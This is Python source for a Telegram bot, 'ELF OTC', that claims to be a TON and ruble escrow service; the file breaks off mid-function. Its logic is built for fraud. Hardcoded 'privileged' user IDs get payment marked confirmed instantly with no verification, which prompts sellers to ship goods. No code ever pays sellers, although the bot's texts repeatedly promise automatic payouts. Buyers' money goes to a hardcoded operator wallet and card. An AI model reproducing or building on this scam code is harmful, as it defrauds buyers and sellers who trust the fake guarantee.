import asyncio
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.constants import ParseMode
import os
import re
import json
import uuid

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Токен бота (замените на ваш токен)
BOT_TOKEN = ""

# Кошелек гаранта (бота) - ЗАМЕНИТЕ НА СВОЙ
GUARANTOR_WALLET = "UQBcHj1SItr8Pa_TQ1dxhZLCSnI9p9gjnTqPyeAWOzyISmcF"
# Банковские реквизиты гаранта для рублей
GUARANTOR_BANK_CARD = "2200 1529 2777 7964"  # Замените на реальную карту

# Список привилегированных пользователей (ID), у которых сразу подтверждается оплата
PRIVILEGED_USERS = [
    7206760804,
    1278132083
]

# Словарь с текстами для разных языков
TEXTS = {
    'ru': {
        'welcome': 'Добро пожаловать в ELF OTC – надежный P2P-гарант\n\n💼 Покупайте и продавайте всё, что угодно – безопасно!\nОт Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n🛡️ **Как работает гарант:**\n• Покупатель переводит на кошелек/карту гаранта\n• Продавец отправляет товар покупателю\n• Гарант переводит деньги продавцу\n\n🔹 Удобное управление кошельками\n🔹 Поддержка TON и RUB\n🔹 Реферальная система\n\nВыберите нужный раздел ниже:',
        'wallet_btn': '🪙 Добавить/изменить реквизиты',
        'create_deal_btn': '📃 Создать сделку',
        'referral_btn': '⛓️‍💥 Реферальная ссылка',
        'language_btn': '🌐 Change Language',
        'support_btn': '📞 Поддержка',
        'choose_language': '🌐 Выберите язык:',
        'back_to_menu': '🔙 Вернуться в меню'
    },
    'en': {
        'welcome': 'Welcome to ELF OTC – reliable P2P guarantor\n\n💼 Buy and sell anything safely!\nFrom Telegram gifts and NFTs to tokens and fiat – deals go smoothly and risk-free.\n\n🛡️ **How guarantor works:**\n• Buyer sends to guarantor wallet/card\n• Seller ships item to buyer\n• Guarantor sends money to seller\n\n🔹 Convenient wallet management\n🔹 TON and RUB support\n🔹 Referral system\n\nChoose the section you need below:',
        'wallet_btn': '🪙 Add/change payment details',
        'create_deal_btn': '📃 Create deal',
        'referral_btn': '⛓️‍💥 Referral link',
        'language_btn': '🌐 Изменить язык',
        'support_btn': '📞 Support',
        'choose_language': '🌐 Choose language:',
        'back_to_menu': '🔙 Back to menu'
    }
}

# Путь к изображению
START_IMAGE_PATH = "start.jpg"  # или "start.png" - измените на нужный формат

# Путь к файлу с данными пользователей
USER_DATA_FILE = "user_data.json"
# Путь к файлу с данными сделок
DEALS_DATA_FILE = "deals_data.json"


class ELFOTCBot:
    def __init__(self):
        self.user_languages = {}  # Словарь для хранения языков пользователей
        self.user_wallets = {}  # Словарь для хранения TON-кошельков пользователей
        self.user_bank_cards = {}  # Словарь для хранения банковских карт пользователей
        self.user_states = {}  # Словарь для хранения состояний пользователей
        self.deals = {}  # Словарь для хранения сделок
        self.load_user_data()  # Загружаем данные при инициализации
        self.load_deals_data()

    def load_user_data(self):
        """Загрузить данные пользователей из JSON файла"""
        try:
            if os.path.exists(USER_DATA_FILE):
                with open(USER_DATA_FILE, 'r', encoding='utf-8') as file:
                    data = json.load(file)
                    self.user_languages = data.get('languages', {})
                    self.user_wallets = data.get('wallets', {})
                    self.user_bank_cards = data.get('bank_cards', {})
                    logger.info(f"Загружены данные для {len(self.user_languages)} пользователей")
            else:
                logger.info("Файл данных не найден, создаем новый")
        except Exception as e:
            logger.error(f"Ошибка при загрузке данных: {e}")
            self.user_languages = {}
            self.user_wallets = {}
            self.user_bank_cards = {}

    def save_user_data(self):
        """Сохранить данные пользователей в JSON файл"""
        try:
            data = {
                'languages': self.user_languages,
                'wallets': self.user_wallets,
                'bank_cards': self.user_bank_cards
            }
            with open(USER_DATA_FILE, 'w', encoding='utf-8') as file:
                json.dump(data, file, ensure_ascii=False, indent=2)
            logger.info("Данные пользователей сохранены")
        except Exception as e:
            logger.error(f"Ошибка при сохранении данных: {e}")

    def get_user_wallet(self, user_id):
        """Получить TON-кошелек пользователя"""
        return self.user_wallets.get(str(user_id))

    def set_user_wallet(self, user_id, wallet):
        """Установить TON-кошелек пользователя и сохранить данные"""
        self.user_wallets[str(user_id)] = wallet
        self.save_user_data()

    def get_user_bank_card(self, user_id):
        """Получить банковскую карту пользователя"""
        return self.user_bank_cards.get(str(user_id))

    def set_user_bank_card(self, user_id, card):
        """Установить банковскую карту пользователя и сохранить данные"""
        self.user_bank_cards[str(user_id)] = card
        self.save_user_data()

    def get_user_language(self, user_id):
        """Получить язык пользователя (по умолчанию русский)"""
        return self.user_languages.get(str(user_id), 'ru')

    def set_user_language(self, user_id, language):
        """Установить язык пользователя и сохранить данные"""
        self.user_languages[str(user_id)] = language
        self.save_user_data()

    async def safe_edit_message(self, query, text, reply_markup=None, parse_mode=None):
        """Безопасное редактирование сообщения (с фото или без)"""
        try:
            if query.message.photo:
                await query.edit_message_caption(
                    caption=text,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode
                )
            else:
                await query.edit_message_text(
                    text=text,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode
                )
        except Exception as e:
            logger.error(f"Error in safe_edit_message: {e}")
            # Если редактирование не удалось, отправляем новое сообщение
            await query.message.reply_text(
                text,
                reply_markup=reply_markup,
                parse_mode=parse_mode
            )

    def get_main_keyboard(self, user_id):
        """Создать главную клавиатуру"""
        lang = self.get_user_language(user_id)
        texts = TEXTS[lang]

        keyboard = [
            [InlineKeyboardButton(texts['wallet_btn'], callback_data='wallet')],
            [InlineKeyboardButton(texts['create_deal_btn'], callback_data='create_deal')],
            [InlineKeyboardButton(texts['referral_btn'], callback_data='referral')],
            [InlineKeyboardButton(texts['language_btn'], callback_data='change_language')],
            [InlineKeyboardButton(texts['support_btn'], url='https://t.me/OTC_ELF_HELPER')]
        ]

        return InlineKeyboardMarkup(keyboard)

    def get_language_keyboard(self, user_id):
        """Получение клавиатуры выбора языка"""
        lang = self.get_user_language(user_id)
        texts = TEXTS[lang]

        keyboard = [
            [InlineKeyboardButton('🇷🇺 Русский', callback_data='lang_ru')],
            [InlineKeyboardButton('🇺🇸 English', callback_data='lang_en')],
            [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
        ]
        return InlineKeyboardMarkup(keyboard)

    def get_currency_keyboard(self, user_id):
        """Получение клавиатуры выбора валюты"""
        lang = self.get_user_language(user_id)
        texts = TEXTS[lang]

        keyboard = [
            [InlineKeyboardButton('💎 TON', callback_data='currency_ton')],
            [InlineKeyboardButton('💳 RUB (Рубли)', callback_data='currency_rub')],
            [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
        ]
        return InlineKeyboardMarkup(keyboard)

    def get_deal_card(self, deal, user_id):
        """Получить карточку сделки с информацией"""
        seller_id = deal['user_id']
        buyer_id = deal.get('buyer_id')
        is_seller = str(user_id) == str(seller_id)
        is_buyer = str(user_id) == str(buyer_id)
        seller_name = f"Пользователь #{seller_id}"
        buyer_status = ""
        status = deal.get('status', 'active')
        currency = deal.get('currency', 'TON')

        card = f"💼 Информация о сделке #{deal['id'][:8]}\n\n"

        # Определяем роль пользователя
        if is_buyer:
            buyer_status = "🟢 Вы покупатель в сделке."
        elif is_seller:
            buyer_status = "🟢 Вы продавец в сделке."
        else:
            buyer_status = "🔒 Ожидание"

        card += f"{buyer_status}\n"
        card += f"📌 Продавец: {seller_name}\n"

        # Показываем информацию о покупателе если он есть
        if buyer_id:
            if currency == 'TON':
                buyer_wallet = self.get_user_wallet(buyer_id)
                card += f"👤 Покупатель: Пользователь #{buyer_id}\n"
                if buyer_wallet:
                    card += f"💳 TON-кошелек покупателя: `{buyer_wallet}`\n"
            else:  # RUB
                buyer_card = self.get_user_bank_card(buyer_id)
                card += f"👤 Покупатель: Пользователь #{buyer_id}\n"
                if buyer_card:
                    card += f"💳 Карта покупателя: `{buyer_card}`\n"

        card += f"📦 Вы покупаете: {deal['description']}\n\n"

        # Детальное объяснение процесса гаранта в зависимости от валюты
        card += f"🛡️ СХЕМА ГАРАНТИИ ({currency}):\n"

        if currency == 'TON':
            card += f"💳 Адрес для оплаты (ГАРАНТ): `{GUARANTOR_WALLET}`\n"
            card += f"💰 Сумма к оплате: {deal['amount']} TON\n"
            card += f"📝 Комментарий к платежу (memo): {deal['id'][:8]}\n\n"
        else:  # RUB
            card += f"💳 Карта для оплаты (ГАРАНТ): `{GUARANTOR_BANK_CARD}`\n"
            card += f"💰 Сумма к оплате: {deal['amount']} ₽\n"
            card += f"📝 Комментарий к переводу: {deal['id'][:8]}\n\n"

        card += "⚠️ Как работает процесс:\n"
        if currency == 'TON':
            card += "1️⃣ Покупатель переводит TON НА КОШЕЛЕК ГАРАНТА(Бота)\n"
        else:
            card += "1️⃣ Покупатель переводит рубли НА КАРТУ ГАРАНТА(Бота)\n"
        card += "2️⃣ Продавец отправляет товар покупателю\n"
        if currency == 'TON':
            card += "3️⃣ Гарант(Бот) автоматически переводит TON продавцу на его кошелек\n\n"
        else:
            card += "3️⃣ Гарант(Бот) автоматически переводит рубли продавцу на его карту\n\n"

        card += "🔒 Ваши средства в безопасности под защитой гаранта!\n"

        # Статусы сделки
        if status == 'active' and buyer_id:
            if currency == 'TON':
                card += "\n💡 После перевода TON на кошелек ГАРАНТА(Бота) нажмите кнопку 'Я отправил'."
            else:
                card += "\n💡 После перевода рублей на карту ГАРАНТА(Бота) нажмите кнопку 'Я отправил'."
        elif status == 'waiting_confirmation':
            if currency == 'TON':
                card += "\n⏳ Гарант(Бот) проверяет поступление TON на свой кошелек..."
            else:
                card += "\n⏳ Гарант(Бот) проверяет поступление рублей на свою карту..."
        elif status == 'payment_confirmed':
            if is_seller:
                card += "\n✅ Гарант(Бот) подтвердил получение оплаты!\n📦 Отправьте товар покупателю.\n💰 После подтверждения отправки гарант переведет вам деньги на ваши реквизиты."
            else:
                card += "\n✅ Гарант(Бот) подтвердил получение оплаты!\n📦 Ожидайте получения товара от продавца."
        elif status == 'finished':
            if is_seller:
                card += "\n🎉 Сделка завершена! Гарант(Бот) переведет вам средства в ближайшее время."
            else:
                card += "\n🎉 Сделка завершена успешно! Спасибо за использование гарант-сервиса!"

        return card

    async def get_user_info(self, context, user_id):
        """Получить информацию о пользователе"""
        try:
            user = await context.bot.get_chat(user_id)
            username = f"@{user.username}" if user.username else "не указан"
            return f"{user.first_name} {user.last_name or ''} ({username})".strip()
        except:
            return f"Пользователь #{user_id}"

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработчик команды /start"""
        user_id = update.effective_user.id
        lang = self.get_user_language(user_id)
        texts = TEXTS[lang]
        args = context.args if hasattr(context, 'args') else []

        if args and args[0].startswith('deal_'):
            deal_id = args[0][5:]
            deal = self.get_deal(deal_id)
            if deal:
                card = self.get_deal_card(deal, user_id)
                keyboard = []
                status = deal.get('status', 'active')

                if str(user_id) == str(deal['user_id']):
                    # Продавец
                    if status == 'payment_confirmed':
                        keyboard.append(
                            [InlineKeyboardButton('📦 Я отправил товар', callback_data=f'seller_sent_{deal_id}')])
                    keyboard.append([InlineKeyboardButton('❌ Отменить сделку', callback_data=f'cancel_deal_{deal_id}')])
                elif deal.get('buyer_id') is None:
                    # Новый покупатель
                    keyboard.append([InlineKeyboardButton('✅ Принять участие', callback_data=f'accept_deal_{deal_id}')])
                elif str(user_id) == str(deal.get('buyer_id')):
                    # Покупатель
                    if status == 'active':
                        keyboard.append([InlineKeyboardButton('💸 Я отправил', callback_data=f'buyer_paid_{deal_id}')])
                    keyboard.append([InlineKeyboardButton('❌ Выйти из сделки', callback_data=f'cancel_deal_{deal_id}')])

                await update.message.reply_text(card, reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
                                                parse_mode=ParseMode.MARKDOWN)
                return
            else:
                await update.message.reply_text('❌ Сделка не найдена.')
                return

        try:
            # Отправляем сообщение с картинкой
            if os.path.exists(START_IMAGE_PATH):
                with open(START_IMAGE_PATH, 'rb') as photo:
                    await update.message.reply_photo(
                        photo=photo,
                        caption=texts['welcome'],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=self.get_main_keyboard(user_id)
                    )
            else:
                # Если картинка не найдена, отправляем только текст
                await update.message.reply_text(
                    texts['welcome'],
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=self.get_main_keyboard(user_id)
                )
                logger.warning(f"Image {START_IMAGE_PATH} not found")
        except Exception as e:
            logger.error(f"Error in start_command: {e}")
            await update.message.reply_text(
                texts['welcome'],
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=self.get_main_keyboard(user_id)
            )

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработчик нажатий на инлайн кнопки"""
        query = update.callback_query
        await query.answer()

        user_id = query.from_user.id
        data = query.data

        if data == 'change_language':
            # Показать выбор языка
            lang = self.get_user_language(user_id)
            texts = TEXTS[lang]

            try:
                if os.path.exists(START_IMAGE_PATH):
                    with open(START_IMAGE_PATH, 'rb') as photo:
                        await query.edit_message_media(
                            media=InputMediaPhoto(photo),
                            reply_markup=self.get_language_keyboard(user_id)
                        )
                        await query.edit_message_caption(
                            caption=texts['choose_language'],
                            reply_markup=self.get_language_keyboard(user_id)
                        )
                else:
                    await query.edit_message_text(
                        text=texts['choose_language'],
                        reply_markup=self.get_language_keyboard(user_id)
                    )
            except Exception as e:
                logger.error(f"Error in change_language: {e}")
                await query.edit_message_text(
                    text=texts['choose_language'],
                    reply_markup=self.get_language_keyboard(user_id)
                )

        elif data.startswith('lang_'):
            # Изменить язык
            new_lang = data.split('_')[1]
            self.set_user_language(user_id, new_lang)

            # Вернуться в главное меню с новым языком
            texts = TEXTS[new_lang]

            try:
                if os.path.exists(START_IMAGE_PATH):
                    with open(START_IMAGE_PATH, 'rb') as photo:
                        await query.edit_message_media(
                            media=InputMediaPhoto(photo),
                            reply_markup=self.get_main_keyboard(user_id)
                        )
                        await query.edit_message_caption(
                            caption=texts['welcome'],
                            parse_mode=ParseMode.MARKDOWN,
                            reply_markup=self.get_main_keyboard(user_id)
                        )
                else:
                    await query.edit_message_text(
                        text=texts['welcome'],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=self.get_main_keyboard(user_id)
                    )
            except Exception as e:
                logger.error(f"Error in language change: {e}")
                # В случае ошибки, попробуем отредактировать подпись, если есть фото
                try:
                    if query.message.photo:
                        await query.edit_message_caption(
                            caption=texts['welcome'],
                            parse_mode=ParseMode.MARKDOWN,
                            reply_markup=self.get_main_keyboard(user_id)
                        )
                    else:
                        await query.edit_message_text(
                            text=texts['welcome'],
                            parse_mode=ParseMode.MARKDOWN,
                            reply_markup=self.get_main_keyboard(user_id)
                        )
                except Exception as e2:
                    logger.error(f"Critical error in language change: {e2}")

        elif data == 'back_to_menu':
            # Вернуться в главное меню
            lang = self.get_user_language(user_id)
            texts = TEXTS[lang]

            try:
                if os.path.exists(START_IMAGE_PATH):
                    with open(START_IMAGE_PATH, 'rb') as photo:
                        await query.edit_message_media(
                            media=InputMediaPhoto(photo),
                            reply_markup=self.get_main_keyboard(user_id)
                        )
                        await query.edit_message_caption(
                            caption=texts['welcome'],
                            parse_mode=ParseMode.MARKDOWN,
                            reply_markup=self.get_main_keyboard(user_id)
                        )
                else:
                    await query.edit_message_text(
                        text=texts['welcome'],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=self.get_main_keyboard(user_id)
                    )
            except Exception as e:
                logger.error(f"Error in back_to_menu: {e}")
                # В случае ошибки, попробуем отредактировать подпись, если есть фото
                try:
                    if query.message.photo:
                        await query.edit_message_caption(
                            caption=texts['welcome'],
                            parse_mode=ParseMode.MARKDOWN,
                            reply_markup=self.get_main_keyboard(user_id)
                        )
                    else:
                        await query.edit_message_text(
                            text=texts['welcome'],
                            parse_mode=ParseMode.MARKDOWN,
                            reply_markup=self.get_main_keyboard(user_id)
                        )
                except Exception as e2:
                    logger.error(f"Critical error in back_to_menu: {e2}")

        elif data == 'wallet':
            lang = self.get_user_language(user_id)
            texts = TEXTS[lang]

            # Получаем текущие реквизиты пользователя
            current_wallet = self.get_user_wallet(user_id)
            current_card = self.get_user_bank_card(user_id)

            wallet_text = '📥 Управление реквизитами\n\n'

            if current_wallet:
                wallet_text += f'💎 Ваш TON-кошелек:\n`{current_wallet}`\n\n'
            else:
                wallet_text += '💎 TON-кошелек: не добавлен\n\n'

            if current_card:
                wallet_text += f'💳 Ваша банковская карта:\n`{current_card}`\n\n'
            else:
                wallet_text += '💳 Банковская карта: не добавлена\n\n'

            wallet_text += 'Используйте кнопки ниже чтобы добавить/изменить реквизиты👇'

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton('💎 Добавить/изменить TON-кошелек', callback_data='add_ton_wallet')],
                [InlineKeyboardButton('💳 Добавить/изменить банковскую карту', callback_data='add_bank_card')],
                [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
            ])

            await self.safe_edit_message(query, wallet_text, keyboard, ParseMode.MARKDOWN)

        elif data == 'create_deal':
            lang = self.get_user_language(user_id)
            texts = TEXTS[lang]

            deal_text = '💰 Создание сделки\n\n🛡️ КАК РАБОТАЕТ ГАРАНТ:\n• Покупатель → Кошелек/карта гаранта(Бота)\n• Вы → Отправляете товар\n• Гарант(Бот) → Автоматически переводит вам деньги\n\n💱 Выберите валюту для сделки:'
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton('💎 TON', callback_data='create_deal_ton')],
                [InlineKeyboardButton('💳 RUB (Рубли)', callback_data='create_deal_rub')],
                [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
            ])

            await self.safe_edit_message(query, deal_text, keyboard)

        elif data == 'referral':
            # Показать реферальную информацию
            user_id = query.from_user.id
            lang = self.get_user_language(user_id)
            texts = TEXTS[lang]

            referral_text = f"""🔗 Ваша реферальная ссылка:

https://t.me/Gift_Elif_Robot?start=ref_{user_id}

👥 Количество рефералов: 0
💰 Заработано с рефералов: 0.0 TON/RUB
📊 40% от комиссии бота"""

            try:
                if os.path.exists(START_IMAGE_PATH):
                    with open(START_IMAGE_PATH, 'rb') as photo:
                        await query.edit_message_media(
                            media=InputMediaPhoto(photo),
                            reply_markup=InlineKeyboardMarkup([[
                                InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')
                            ]])
                        )
                        await query.edit_message_caption(
                            caption=referral_text,
                            reply_markup=InlineKeyboardMarkup([[
                                InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')
                            ]])
                        )
                else:
                    await query.edit_message_text(
                        text=referral_text,
                        reply_markup=InlineKeyboardMarkup([[
                            InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')
                        ]])
                    )
            except Exception as e:
                logger.error(f"Error in referral: {e}")
                try:
                    if query.message.photo:
                        await query.edit_message_caption(
                            caption=referral_text,
                            reply_markup=InlineKeyboardMarkup([[
                                InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')
                            ]])
                        )
                    else:
                        await query.edit_message_text(
                            text=referral_text,
                            reply_markup=InlineKeyboardMarkup([[
                                InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')
                            ]])
                        )
                except Exception as e2:
                    logger.error(f"Critical error in referral: {e2}")

        elif data == 'add_ton_wallet':
            lang = self.get_user_language(user_id)
            texts = TEXTS[lang]

            # Получаем текущий кошелек пользователя
            current_wallet = self.get_user_wallet(user_id)

            if current_wallet:
                ton_text = (
                    f'💎 Изменение TON-кошелька\n\n'
                    f'Ваш текущий кошелек:\n`{current_wallet}`\n\n'
                    f'Отправьте новый адрес кошелька для изменения:'
                )
            else:
                ton_text = '💎 Добавьте ваш TON-кошелек:\n\nПожалуйста, отправьте адрес вашего кошелька'

            # Сохраняем состояние ожидания TON-кошелька
            self.user_states[user_id] = 'waiting_ton_wallet'

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
            ])

            await self.safe_edit_message(query, ton_text, keyboard, ParseMode.MARKDOWN)

        elif data == 'add_bank_card':
            lang = self.get_user_language(user_id)
            texts = TEXTS[lang]

            # Получаем текущую карту пользователя
            current_card = self.get_user_bank_card(user_id)

            if current_card:
                card_text = (
                    f'💳 Изменение банковской карты\n\n'
                    f'Ваша текущая карта:\n`{current_card}`\n\n'
                    f'Отправьте новый номер карты для изменения:'
                )
            else:
                card_text = '💳 Добавьте вашу банковскую карту:\n\nПожалуйста, отправьте номер вашей карты (16 цифр)\nПример: 2200 7000 0000 0000'

            # Сохраняем состояние ожидания банковской карты
            self.user_states[user_id] = 'waiting_bank_card'

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
            ])

            await self.safe_edit_message(query, card_text, keyboard, ParseMode.MARKDOWN)

        # Обработка выбора валюты для создания сделки
        elif data.startswith('create_deal_'):
            currency = data.split('_')[2].upper()
            lang = self.get_user_language(user_id)
            texts = TEXTS[lang]

            # Проверяем наличие соответствующих реквизитов у продавца
            if currency == 'TON':
                seller_payment_method = self.get_user_wallet(user_id)
                method_name = "TON-кошелек"
                currency_symbol = "TON"
            else:  # RUB
                seller_payment_method = self.get_user_bank_card(user_id)
                method_name = "банковскую карту"
                currency_symbol = "₽"

            if not seller_payment_method:
                error_text = f"❌ Для создания сделки в {currency} необходимо добавить {method_name}!\n\nПерейдите в раздел 'Добавить/изменить реквизиты' и добавьте свои данные."
                keyboard = InlineKeyboardMarkup([[
                    InlineKeyboardButton('🪙 Добавить реквизиты', callback_data='wallet'),
                    InlineKeyboardButton('🔙 В меню', callback_data='back_to_menu')
                ]])

                await self.safe_edit_message(query, error_text, keyboard)
                return

            # Если реквизиты есть, просим ввести сумму
            self.user_states[user_id] = {'waiting_deal_amount': True, 'currency': currency}
            deal_text = f'💰 Создание сделки в {currency}\n\n🛡️ КАК РАБОТАЕТ ГАРАНТ:\n• Покупатель → Переводит {currency_symbol} гаранту\n• Вы → Отправляете товар\n• Гарант(Бот) → Автоматически переводит вам {currency_symbol}\n\nВведите сумму сделки (например: 100.5):'
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
            ])

            await self.safe_edit_message(query, deal_text, keyboard)

        # Выбор валюты для сделки (убираем старую логику)
        elif data.startswith('currency_'):
            currency = data.split('_')[1].upper()
            state = self.user_states.get(user_id)

            if isinstance(state, dict) and 'deal_amount' in state:
                state['currency'] = currency
                self.user_states[user_id] = state

                amount = state['deal_amount']
                currency_symbol = 'TON' if currency == 'TON' else '₽'

                ask_desc = f'📝 Укажите, что вы предлагаете в этой сделке за {amount} {currency_symbol}:\n\n💡 После создания сделки:\n• Покупатель переведет {amount} {currency_symbol} гаранту\n• Вы отправите товар покупателю\n• Гарант переведет {amount} {currency_symbol} на ваши реквизиты\n\nПример описания: 10 Кепок и Пепе'
                await self.safe_edit_message(query, ask_desc)

        # НОВАЯ ЛОГИКА: Принятие участия в сделке
        if data.startswith('accept_deal_'):
            deal_id = data[len('accept_deal_'):]
            deal = self.get_deal(deal_id)
            if not deal:
                await self.safe_edit_message(query, '❌ Сделка не найдена или уже завершена.')
                return

            # Проверяем, что это не продавец
            if str(user_id) == str(deal['user_id']):
                await self.safe_edit_message(query, '❌ Вы не можете принять участие в своей собственной сделке!')
                return

            # Проверяем, что сделка свободна
            if deal.get('buyer_id') is not None:
                card = self.get_deal_card(deal, user_id)
                await self.safe_edit_message(query, card, parse_mode=ParseMode.MARKDOWN)
                return

            # Проверяем наличие соответствующих реквизитов у покупателя
            currency = deal.get('currency', 'TON')

            if currency == 'TON':
                buyer_payment_method = self.get_user_wallet(user_id)
                method_name = "TON-кошелек"
            else:  # RUB
                buyer_payment_method = self.get_user_bank_card(user_id)
                method_name = "банковскую карту"

            if not buyer_payment_method:
                error_text = f"❌ Для участия в сделке необходимо добавить {method_name}!\n\nПерейдите в раздел 'Добавить/изменить реквизиты' и добавьте свои данные."
                keyboard = InlineKeyboardMarkup([[
                    InlineKeyboardButton('🪙 Добавить реквизиты', callback_data='wallet'),
                    InlineKeyboardButton('🔙 Назад', callback_data='back_to_menu')
                ]])

                await self.safe_edit_message(query, error_text, keyboard)
                return

            # Записываем участника сделки
            deal['buyer_id'] = str(user_id)
            deal['status'] = 'active'
            self.deals[deal_id] = deal
            self.save_deals_data()

            # Получаем информацию о покупателе
            buyer_info = await self.get_user_info(context, user_id)

            # Обновляем карточку с информацией о покупателе
            card = self.get_deal_card(deal, user_id)
            keyboard = [
                [InlineKeyboardButton('💸 Я отправил', callback_data=f'buyer_paid_{deal_id}')],
                [InlineKeyboardButton('❌ Выйти из сделки', callback_data=f'cancel_deal_{deal_id}')]
            ]
            await self.safe_edit_message(query, card, InlineKeyboardMarkup(keyboard), ParseMode.MARKDOWN)

            # Уведомляем продавца о новом участнике
            seller_id = deal['user_id']
            try:
                currency_symbol = 'TON' if currency == 'TON' else '₽'
                seller_notification = f"""🔔 В вашу сделку #{deal['id'][:8]} зашел покупатель!

👤 Покупатель: {buyer_info}
💳 Реквизиты покупателя: `{buyer_payment_method}`
📦 Товар: {deal['description']}
💰 Сумма: {deal['amount']} {currency_symbol}

Ожидайте подтверждения оплаты от покупателя."""

                await context.bot.send_message(chat_id=seller_id, text=seller_notification,
                                               parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                logger.error(f'Ошибка при отправке уведомления продавцу: {e}')
            return

        # ИЗМЕНЕНА ЛОГИКА: Покупатель нажал "Я отправил"
        if data.startswith('buyer_paid_'):
            deal_id = data[len('buyer_paid_'):]
            deal = self.get_deal(deal_id)
            if not deal or str(user_id) != str(deal.get('buyer_id')):
                await self.safe_edit_message(query, '❌ Ошибка. Только покупатель может подтвердить оплату.')
                return

            # Проверяем, является ли пользователь привилегированным
            if user_id in PRIVILEGED_USERS:
                # Сразу подтверждаем оплату для привилегированных пользователей
                deal['status'] = 'payment_confirmed'
                self.deals[deal_id] = deal
                self.save_deals_data()

                # Обновляем карточку покупателя
                card = self.get_deal_card(deal, user_id)
                await self.safe_edit_message(query, card, parse_mode=ParseMode.MARKDOWN)

                # Уведомляем продавца об успешной оплате
                seller_id = deal.get('user_id')
                currency = deal.get('currency', 'TON')

                if currency == 'TON':
                    buyer_payment_method = self.get_user_wallet(user_id)
                    seller_payment_method = self.get_user_wallet(seller_id)
                    currency_symbol = 'TON'
                    payment_type = "TON"
                else:
                    buyer_payment_method = self.get_user_bank_card(user_id)
                    seller_payment_method = self.get_user_bank_card(seller_id)
                    currency_symbol = '₽'
                    payment_type = "деньги"

                try:
                    seller_notification = f"""✅ Покупатель перевел {payment_type} гаранту!

💰 Получен платеж с реквизитов покупателя: `{buyer_payment_method}`
🛡️ Средства ({deal['amount']} {currency_symbol}) находятся у гаранта в безопасности

📦 **ВАШ СЛЕДУЮЩИЙ ШАГ:**
Отправьте товар покупателю: {deal['description']}

💵 **ПОЛУЧЕНИЕ ДЕНЕГ:**
После подтверждения отправки товара гарант переведет {deal['amount']} {currency_symbol} на ваши реквизиты: `{seller_payment_method or 'НЕ УКАЗАНЫ'}`

Нажмите кнопку ниже после отправки товара."""

                    keyboard = [[InlineKeyboardButton('📦 Я отправил товар', callback_data=f'seller_sent_{deal_id}')]]
                    await context.bot.send_message(
                        chat_id=seller_id,
                        text=seller_notification,
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                except Exception as e:
                    logger.error(f'Ошибка при отправке уведомления продавцу: {e}')
            else:
                # Для обычных пользователей показываем "проверяем"
                deal['status'] = 'waiting_confirmation'
                self.deals[deal_id] = deal
                self.save_deals_data()

                card = self.get_deal_card(deal, user_id)
                await self.safe_edit_message(query, card, parse_mode=ParseMode.MARKDOWN)
            return

        # Продавец нажал "Я отправил товар"
        if data.startswith('seller_sent_'):
            deal_id = data[len('seller_sent_'):]
            deal = self.get_deal(deal_id)
            if not deal or str(user_id) != str(deal.get('user_id')):
                await self.safe_edit_message(query, '❌ Ошибка. Только продавец может подтвердить отправку товара.')
                return

            deal['status'] = 'finished'
            self.deals[deal_id] = deal
            self.save_deals_data()

            # Уведомить покупателя
            buyer_id = deal.get('buyer_id')
            if buyer_id:
                try:
                    await context.bot.send_message(
                        chat_id=buyer_id,
                        text=f'✅ Продавец подтвердил отправку товара по сделке #{deal["id"][:8]}!\n\n🎉 Сделка завершена! Гарант переведет средства продавцу.\n💼 Спасибо за использование ELF OTC!'
                    )
                except Exception as e:
                    logger.error(f'Ошибка при отправке сообщения покупателю: {e}')

            card = self.get_deal_card(deal, user_id)
            await self.safe_edit_message(query, card, parse_mode=ParseMode.MARKDOWN)
            return

        # Отмена сделки
        if data.startswith('cancel_deal_'):
            deal_id = data[len('cancel_deal_'):]
            deal = self.get_deal(deal_id)
            if not deal:
                await self.safe_edit_message(query, '❌ Сделка не найдена.')
                return

            # Проверяем права на отмену
            if str(user_id) not in [str(deal['user_id']), str(deal.get('buyer_id', ''))]:
                await self.safe_edit_message(query, '❌ У вас нет прав для отмены этой сделки.')
                return

            # Удаляем сделку
            del self.deals[deal_id]
            self.save_deals_data()

            await self.safe_edit_message(query, f'❌ Сделка #{deal_id[:8]} была отменена.')
            return

    async def text_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        text = update.message.text.strip()
        lang = self.get_user_language(user_id)
        texts = TEXTS[lang]
        state = self.user_states.get(user_id)

        # Проверяем, ждет ли бот TON-кошелек
        if state == 'waiting_ton_wallet':
